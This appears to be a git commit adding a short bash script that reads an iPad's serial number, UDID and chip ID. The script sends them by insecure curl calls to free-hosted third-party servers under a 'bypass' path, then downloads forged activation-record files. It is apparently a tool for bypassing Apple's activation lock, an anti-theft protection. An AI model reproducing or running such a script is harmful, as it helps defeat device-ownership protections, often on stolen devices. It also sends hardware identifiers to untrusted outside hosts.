ca933aa283cb4eecebfe0601d400f2763e872fea
GSM ADJAA <96638829+jacquesTech@users.noreply.github.com>
2023-04-03 09:34:13 +0200

    Create fix-gen-IPADS NO SN CHANGE.sh

---
+++ fix-gen-IPADS NO SN CHANGE.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+
+Prnt(){ printf $1; };
+Slp(){ sleep $1; };
+Replace(){ sed "s/$1/$2/g"; };
+Devi(){ ./ideviceinfo | grep -w $1 | awk '{printf $NF}'; };
+PLutil(){ echo -e $1 >>$2; };
+
+chmod +x ideviceinfo
+printf "generating activation record"; Prnt "."; Slp ".2"; Prnt "."; Slp ".2"; Prnt "."; Slp ".2"; Prnt ".";
+curl -s -k "http://gsmadjaa.000webhostapp.com/bypass/activatorFix.php?sn=$(Devi SerialNumber)&udid=$(Devi UniqueDeviceID)&ucid=$(Devi UniqueChipID)" --output activation_record.plist
+echo ''
+printf "making IC-Info.sisv"; Prnt "."; Slp ".2"; Prnt "."; Slp ".2"; Prnt "."; Slp ".2"; Prnt ".";
+curl -s -k "https://gsmadjaa.x10.bz/helloserver/Devices/activation_records/$(Devi UniqueDeviceID)/IC-Info.sisv" --output IC-Info.sisv
+echo ''
+echo "FILES SUCCESSFULLY GENERATED"
